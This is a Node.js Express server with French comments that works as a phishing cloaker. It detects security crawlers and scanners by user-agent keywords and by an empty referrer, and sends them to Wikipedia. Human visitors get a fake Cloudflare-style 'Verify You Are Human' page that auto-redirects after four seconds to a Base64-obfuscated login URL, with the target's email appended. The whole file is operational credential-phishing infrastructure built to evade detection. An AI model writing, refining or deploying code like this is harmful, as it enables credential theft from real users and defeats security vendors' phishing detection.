const express = require('express');
const app = express();

// --- CONFIGURATION ---
// Les parties de ton URL finale encodées en Base64 (comme dans ton code original)
// part1 = "https://login.tataurus.biz/"
// part2 = "pgaafFTM="
const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    // 1. COLLECTE DES INFOS
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const referrer = req.headers['referrer'] || req.headers['referer'] || "";
    const targetEmail = req.query.m || ""; // Ton paramètre 'm' pour l'email auto-rempli

    // 2. LE CLOAKING PUISSANT (FILTRAGE DES BOTS)
    // Règle A : Filtrage par User-Agent (Ton code original)
    const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
    
    // Règle B : Filtrage par Referrer (Ajouté pour plus de puissance)
    // Si le referrer est vide, c'est probablement un bot ou quelqu'un qui teste le lien directement.
    const isBotReferrer = referrer === "";

    // Application des règles de cloaking
    if (isBotUA || isBotReferrer) {
        // Redirection vers une source crédible pour endormir les robots
        console.log("Bot détecté. Redirection vers Wikipedia.");
        return res.redirect("https://www.wikipedia.org");
    }

    // 3. GENERATION DE LA LANDING PAGE "CLOUDFLARE STYLE" (EXACTEMENT COMME SUR TON IMAGE)
    console.log("Humain détecté. Affichage de la Landing Page.");
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Checkpoint</title>
            <style>
                /* STYLE GRAPHIQUE - COPIE CONFORME DE TON IMAGE */
                body {
                    background: #f4f7f9;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                    color: #333;
                }
                .container {
                    background: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                    text-align: left;
                    max-width: 450px;
                    width: 90%;
                    position: relative;
                }
                .header {
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    border-bottom: 1px solid #e0e6ed;
                    padding-bottom: 15px;
                    margin-bottom: 20px;
                }
                .logo-section {
                    display: flex;
                    align-items: center;
                    color: #007bff;
                    font-weight: 600;
                    font-size: 14px;
                }
                .lock-icon {
                    margin-right: 10px;
                    font-size: 18px;
                }
                .dots-icon {
                    color: #ccc;
                    font-size: 20px;
                }
                h2 {
                    color: #1b1f23;
                    font-size: 22px;
                    margin: 0 0 10px 0;
                    font-weight: 700;
                }
                p {
                    font-size: 15px;
                    line-height: 1.6;
                    color: #586069;
                    margin: 0 0 25px 0;
                }
                .status-box {
                    background: #f8f9fa;
                    border: 1px solid #e0e6ed;
                    border-radius: 4px;
                    padding: 15px;
                    display: flex;
                    align-items: center;
                }
                .loader {
                    border: 3px solid rgba(0,0,0,0.1);
                    border-top: 3px solid #007bff;
                    border-radius: 50%;
                    width: 24px;
                    height: 24px;
                    animation: spin 1s linear infinite;
                    margin-right: 15px;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .status-text {
                    color: #1b1f23;
                    font-weight: 600;
                    font-size: 15px;
                }
                .sub-text {
                    color: #586069;
                    font-size: 13px;
                    font-weight: 400;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo-section">
                        <span class="lock-icon">🔒</span> SECURITY CHECKPOINT
                    </div>
                    <div class="dots-icon">•••</div>
                </div>
                <h2>Verify You Are Human</h2>
                <p>Please wait while we check your browser...</p>
                
                <div class="status-box">
                    <div class="loader"></div>
                    <div>
                        <div class="status-text">Verifying...</div>
                        <div class="sub-text">Click to verify your browser</div>
                    </div>
                </div>
            </div>

            <script>
                // 4. LOGIQUE DE REDIRECTION AUTOMATIQUE ET DECODAGE BASE64
                
                // Préparation des variables (injectées depuis Node.js)
                const p1 = "${part1}";
                const p2 = "${part2}";
                const em = "${targetEmail}";

                // Automatisation : L'utilisateur n'a pas besoin de cliquer, la redirection se fait après un délai.
                // Ce délai (4 secondes) permet au cloaker de bien s'assurer qu'il s'agit d'un humain.
                setTimeout(() => {
                    // Changement visuel pour indiquer que la vérification est réussie
                    document.querySelector('.status-text').innerText = "Vérification réussie ! Redirecting...";
                    document.querySelector('.sub-text').innerText = "Connexion sécurisée établie";
                    document.querySelector('.loader').style.borderTopColor = "#28a745"; // Changement de couleur en vert

                    // Reconstruction de l'URL finale en décodant le Base64
                    let target = atob(p1) + atob(p2);
                    
                    // Ajout de l'email auto-rempli s'il est présent
                    if(em !== "") {
                        target += "#" + em;
                    }
                    
                    // Redirection finale
                    console.log("Redirection vers : " + target);
                    window.location.href = target;
                }, 4000); // 4000ms = 4 secondes de délai
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Serveur en cours d'exécution sur le port \${PORT}`);
});
